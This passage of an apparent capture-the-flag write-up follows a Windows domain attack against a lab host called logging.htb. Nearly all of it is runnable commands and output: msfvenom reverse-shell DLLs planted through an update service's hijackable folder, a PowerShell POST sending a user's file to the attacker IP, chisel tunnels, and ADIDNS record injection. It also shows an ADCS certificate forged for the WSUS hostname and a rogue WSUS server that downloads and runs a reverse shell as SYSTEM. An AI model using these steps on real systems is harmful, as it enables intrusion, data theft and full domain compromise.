  }
  finally
  {
    FreeLibrary(intPtr);
  }
  Log(path, "Update check completed.");
}
```

So It looks for a zip file with a DLL in it which then gets moved in the bin folder and
loaded by the service, and yes we have write access to that path

```powershell
*Evil-WinRM* PS C:\ProgramData\UpdateMonitor> echo 'asdf' > file.md
*Evil-WinRM* PS C:\ProgramData\UpdateMonitor> dir


    Directory: C:\ProgramData\UpdateMonitor


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        4/16/2026   4:43 PM                Logs
-a----        4/25/2026  11:58 PM             14 file.md
```

## DLL Hijacking

```bash
msfvenom \
  -p windows/x64/shell_reverse_tcp \
  LHOST=10.10.16.84 \
  LPORT=4242 \
  -f dll \
  -o settings_update.dll
```

```bash
zip -r Settings_Update.zip settings_update.dll
```

```powershell
iwr -uri http://10.10.16.84:9090/Settings_Update.zip -OutFile Settings_Update.zip
```

Didn't work, but looking at the logs

```powershell
*Evil-WinRM* PS C:\ProgramData\UpdateMonitor\Logs> dir


    Directory: C:\ProgramData\UpdateMonitor\Logs


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/26/2026  12:56 AM          98856 monitor.log


*Evil-WinRM* PS C:\ProgramData\UpdateMonitor\Logs> type monitor.log
```

```txt
[2026-04-26 00:56:15] Starting Sentinel Update Check...
[2026-04-26 00:56:15] Checking for update on core server...
[2026-04-26 00:56:15] Info: Core did not find file Settings_Update.zip
[2026-04-26 00:56:15] Last status: File not found on core
[2026-04-26 00:56:15] Checking for update on local server...
[2026-04-26 00:56:15] Successfully unzipped update to C:\Program Files\UpdateMonitor\bin\
[2026-04-26 00:56:15] Loading update applier: C:\Program Files\UpdateMonitor\bin\settings_update.dll
[2026-04-26 00:56:15] Failed to load settings_update.dll. Error code: 193
[2026-04-26 00:56:15] Update check completed.
```

Even though the system is x64

```powershell
*Evil-WinRM* PS C:\ProgramData\UpdateMonitor\Logs> [Environment]::Is64BitOperatingSystem
True
```

The binary is x32

```bash
objdump -f UpdateMonitor.exe

UpdateMonitor.exe:     file format pei-i386
architecture: i386, flags 0x0000012f:
HAS_RELOC, EXEC_P, HAS_LINENO, HAS_DEBUG, HAS_LOCALS, D_PAGED
start address 0x0040354a
```

We know because `Error code: 193` is an architecture mismatch

Let's do that same thing for x32

```bash
msfvenom \
  -p windows/shell_reverse_tcp \
  LHOST=10.10.16.84 \
  LPORT=4242 \
  -f dll \
  -o settings_update.dll
```

Hell yea we get a callback

## Further Enumeration as jaylee clifton

```powershell
Get-Content -Path "monitor.log" -Wait -Tail 10
```

```powershell
C:\Windows\system32>whoami
whoami
logging\jaylee.clifton
```

```
```powershell
powershell -ep bypass
```

```powershell
echo $PSVersionTable
```

```powershell
Resolve-Path Incident_4922_WSUS_Remediation_ViewExport.html
```

```powershell
$filePath = "C:\Users\jaylee.clifton\Documents\Tickets\Incident_4922_WSUS_Remediation_ViewExport.html"
$fileBytes = [System.IO.File]::ReadAllBytes($filePath)

Invoke-WebRequest `
  -Uri "http://10.10.16.84:4242"
  -Method POST `
  -ContentType "application/octet-stream"
  -Body $fileBytes `
```

```powershell
rlwrap nc -lvnp 4242
```

Yea all that was completely unecessary, but fun anyways.

```txt
Support Incident View: #4922
Status: CLOSED - WORKAROUND APPLIED Priority: Urgent (Compliance)

2026-04-06 09:45 Internal Note:
Machine is still choking on the standard catalog. BITS service is garbage and I'm not
wasting another morning troubleshooting the local database. Since the "official" server
migration is apparently taking forever, I've pointed this box to the staging endpoint
at wsus.logging.htb.

2026-04-06 13:20 Internal Note:
DNS is still not updatedstandard for this departmentso don't bother pinging it from
outside the test subnet. I've set up a scheduled "ForceSync" task to deal with the
inevitable lockups.

2026-04-06 16:10 Final Resolution:
Task is running on a 120s loop. It nukes SoftwareDistribution and restarts the agent
every cycle. Its a hack, but it works and it keeps the compliance auditors off my back.
Do not touch the trigger settings. If the services don't come back up, that's your problem.
```

```powershell
iwr -uri http://10.10.16.84:9090/chisel.exe -OutFile chisel.exe
```

```powershell
./chisel server -p 4040 --socks5 --reverse
./chisel.exe client 10.10.16.84:4040 R:1080:socks
```

```powershell
proxychains -q \
  nmap \
    -sC -sV \
    -Pn 10.129.39.254 \
    -oN scans/internal.nmap
```

```powershell
iwr -uri http://10.10.16.84:9090/SharpHound.ps1 -OutFile SharpHound.ps1
```

```powershell
Invoke-BloodHound -CollectionMethod All
```


## Spoofing WSUS (Windows Server Update Services)

Looking at the new bloodhound scans we have access to a certificate template, that would probably let us
impersonate the afforementionned wsus server TLS wise. But we also need to gain some kind of man in the middle
possition, probably by creating a dns record to point the wsus address to our own machine

### Leverage ADIDNS to Impersonate the WSUS Server

This fails

```powershell
Add-DnsServerResourceRecordA -Name "wsus.logging.htb" -ZoneName "logging.htb" -IPv4Address "10.10.16.84"
```

Also fails

```powershell
New-ADComputer -Name "wsus" -SamAccountName "wsus" -Enabled $true
```

Also fails

```powershell
Add-DnsServerResourceRecordA -Name "wsus" -ZoneName "logging.htb" -IPv4Address "10.10.16.84"
```

Reading about the fact that apparently by default in AD users can create up to 10 machine accounts,
and those machine accounts can have DNS records.

Looks like PowerMad can do that. I couldn't get it to work though.

```powershell
iwr -uri http://10.10.16.84:9090/Powermad.ps1 -OutFile Powermad.ps1
```

```powershell
. .\Powermad.ps1
New-MachineAccount -MachineAccount "wsus" -Password "Password123!" -Verbose --Domain logging.htb -DomainController DC01.logging.htb
```

```powershell
New-MachineAccount -MachineAccount "wsus" -Password (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Domain "logging.htb" -DomainController "DC01.logging.htb" -Verbose
```

```powershell
$securePass = ConvertTo-SecureString "Password123!" -AsPlainText -Force
New-ADComputer -Name "wsus" -SamAccountName "wsus" -AccountPassword $securePass -Enabled $true -Path "CN=Computers,DC=logging,DC=htb" -Verbose
```

```powershell
New-MachineAccount -MachineAccount "wsus" -Password $(ConvertTo-SecureString 'p@ssword!' -AsPlainText -Force) -Verbose
```

Trying SharpMad

```powershell
.\SharpMad.exe add /machine:wsus /password:Password123! /domain:logging.htb
```

```powershell
iwr -uri http://10.10.16.84:9090/Rubeus.exe -OutFile Rubeus.exe
iwr -uri http://10.10.16.84:9090/Sharpmad.exe -OutFile Sharpmad.exe
```

That works by creating the record directly with ADIDNS!

```powershell
.\Sharpmad.exe ADIDNS -Action new -Node wsus -Data 10.10.16.84
```

It took a minute to propagate, but eventually our address is in the DNS

```powershell
Resolve-DnsName wsus.logging.htb
```

### Obtain a TLS identity for the server

Get Certify on the box

```powershell
iwr -uri http://10.10.16.84:9090/Certify.exe -OutFile Certify.exe
```

```powershell
.\Certify.exe find
```

Certify v1 works but only support adding SANs as UPN, we want a DNS record SAN

```powershell
.\Certify.exe request /ca:DC01.logging.htb\logging-DC01-CA /template:UpdateSrv
.\Certify.exe request /ca:DC01.logging.htb\logging-DC01-CA /template:UpdateSrv /altname:wsus.logging.htb
```

Apparenlty that's possible with Certify v2, which I can't find a pre-compiled binary for.
And I really don't have any windows machine to compile this stuff on. So here comes a fun side-quest of spinning
up a windows machine in Azure, installing visual studio code, and git and so on just to compile
this thing. Yes Password 123 on the internet, I don't care, I'll destroy it in 30 min

```powershell
xfreerdp3 /v:51.104.57.102 /u:blnkn /p:'Password123!' /size:100% /smart-sizing /dynamic-resolution +clipboard
```

Then send myself the binary somehow

```powershell
$ify\bin\Release\Certify.exe"
$fileBytes = [System.IO.File]::ReadAllBytes($filePath)
$base64Data = [Convert]::ToBase64String($fileBytes)
$bodyPayload = @{
    filename = "Certify.exe"
    filedata = $base64Data
} | ConvertTo-Json

Invoke-RestMethod -Uri "134.209.183.194:9090" `
                  -Method Post `
                  -Body $bodyPayload `
                  -ContentType "application/json"
```

Make sure the hash matches after decoding

```powershell
Get-FileHash .\Certify.exe -Algorithm MD5
```

```bash
curl -O http://134.209.183.194:9090/Certify2.exe
```

```bash
md5sum Certify2.exe
```

Get it on the actual box

```bash
iwr -uri http://10.10.16.84:9090/Certify2.exe -OutFile Certify2.exe
```

And boom, now we can generate the x509 identity correctly

```powershell
.\Certify2.exe request --ca DC01.logging.htb\logging-DC01-CA --template UpdateSrv --dns wsus.logging.htb --output-pem
```

And it does have a proper DNS SAN

```bash
wl-paste | openssl x509 -noout -ext subjectAltName -subject -issuer
X509v3 Subject Alternative Name:
    DNS:wsus.logging.htb
subject=DC=htb, DC=logging, CN=Users, CN=jaylee.clifton
issuer=DC=htb, DC=logging, CN=logging-DC01-CA
```

### Build a rogue WSUS server

Pywsus doesn't seem to have TLS support, but wsuks does

```bash
python pywsus.py \
  --host 10.10.16.84 \
  --port 8530 \
  --executable /path/to/PsExec64.exe \
  --command '/accepteula /s cmd.exe /c "net user testuser somepassword /add && net localgroup Administrators testuser /add"'
```

Default tries to use a signed psexec and add a new admin user, but it doesn't work 

```bash
sudo wsuks \
  -I tun0 \
  -t 10.129.53.182 \
  --WSUS-Server wsus.logging.htb \
  --tls-cert certKey.pem \
  --serve-only
```

Tried to just send myself a get, that works

```bash
sudo wsuks \
  -I tun0 \
  -t 10.129.53.182 \
  --WSUS-Server wsus.logging.htb \
  --tls-cert certKey.pem \
  --serve-only \
  -c "/accepteula /s powershell.exe -NoProfile -ep Bypass -Command iwr -Uri 10.10.16.84:9090 -Method Get"
```

Make an executable reverse shell
```bash
msfvenom \
  -p windows/shell_reverse_tcp \
  LHOST=10.10.16.84 \
  LPORT=4242 \
  -f exe \
  -o shell.exe
```

Download it and start it

```bash
sudo wsuks \
  -I tun0 \
  -t 10.129.53.182 \
  --WSUS-Server wsus.logging.htb \
  --tls-cert certKey.pem \
  --serve-only \
  -c "/accepteula /s powershell.exe -NoProfile -ep Bypass -Command iwr -Uri 10.10.16.84:9090/shell.exe -OutFile C:\Windows\Tasks\shell.exe; Start-Process C:\Windows\Tasks\shell.exe"
```

Voila

```powershell
C:\Windows\system32>whoami
whoami
nt authority\system
```
